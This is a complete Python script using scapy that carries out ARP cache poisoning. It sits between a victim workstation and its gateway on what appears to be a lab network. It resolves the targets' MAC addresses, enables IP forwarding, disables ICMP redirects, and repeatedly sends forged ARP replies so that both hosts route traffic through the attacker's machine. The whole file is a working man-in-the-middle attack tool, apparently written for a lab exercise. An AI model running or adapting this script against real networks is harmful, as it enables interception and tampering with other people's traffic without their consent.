#!/usr/bin/env python3
"""
ARP cache poisoning (MITM).
Run from a malicious workstation (ws3, 10.1.0.3) to intercept traffic
between ws2 (10.1.0.2) and the gateway r1 (10.1.0.1).

Usage: python3 attack_ARP.py <victim1_ip> <victim2_ip> [interface]
Example: python3 attack_ARP.py 10.1.0.2 10.1.0.1 ws3-eth0
"""

import sys
import time
import subprocess
from scapy.all import ARP, Ether, IP, ICMP, sendp, srp, conf, get_if_hwaddr

conf.verb = 0

def get_mac(ip, interface):
    """Resolve the real MAC address of a target IP via a real ARP request."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        iface=interface,
        verbose=0,
    )
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def configure_mitm(interface):
    for key, value in [
        ("net.ipv4.ip_forward", "1"),
        ("net.ipv4.conf.all.send_redirects", "0"),
        (f"net.ipv4.conf.{interface}.send_redirects", "0"),
    ]:
        subprocess.run(
            ["sysctl", "-w", f"{key}={value}"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    print(f"[*] MITM configured: ip_forward=1, send_redirects=0 on {interface}")

def trigger_arp_lookup(victim_ip, victim_mac, spoofed_src_ip, interface):
    pkt = (
        Ether(dst=victim_mac) /
        IP(src=spoofed_src_ip, dst=victim_ip) /
        ICMP(type=8)
    )
    sendp(pkt, iface=interface, verbose=0)

def poison(victim1_ip, victim2_ip, interface):
    attacker_mac = get_if_hwaddr(interface)
    print(f"[*] Attacker MAC on {interface}: {attacker_mac}")

    v1_mac = get_mac(victim1_ip, interface)
    v2_mac = get_mac(victim2_ip, interface)
    if not v1_mac or not v2_mac:
        print(f"[!] Could not resolve MACs (v1={v1_mac}, v2={v2_mac}). Aborting.")
        return

    print(f"[*] Victim 1: {victim1_ip} = {v1_mac}")
    print(f"[*] Victim 2: {victim2_ip} = {v2_mac}")

    # Configure ws3 as a transparent MITM before starting to poison.
    configure_mitm(interface)

    print(f"[*] Poisoning caches. Press Ctrl+C to stop.\n")

    poison_v1 = Ether(dst=v1_mac) / ARP(
        op=2, pdst=victim1_ip, hwdst=v1_mac,
        psrc=victim2_ip, hwsrc=attacker_mac,
    )
    poison_v2 = Ether(dst=v2_mac) / ARP(
        op=2, pdst=victim2_ip, hwdst=v2_mac,
        psrc=victim1_ip, hwsrc=attacker_mac,
    )

    count = 0
    while count < 40:
        sendp(poison_v1, iface=interface, verbose=0)
        sendp(poison_v2, iface=interface, verbose=0)
        count += 2

        trigger_arp_lookup(victim1_ip, v1_mac, victim2_ip, interface)
        trigger_arp_lookup(victim2_ip, v2_mac, victim1_ip, interface)

        if count % 10 == 0:
            print(f"    Sent {count} poisoned ARP replies")
        time.sleep(2)


if __name__ == "__main__":
    v1 = sys.argv[1]
    v2 = sys.argv[2]
    iface = sys.argv[3] if len(sys.argv) > 3 else "ws3-eth0"
    poison(v1, v2, iface)
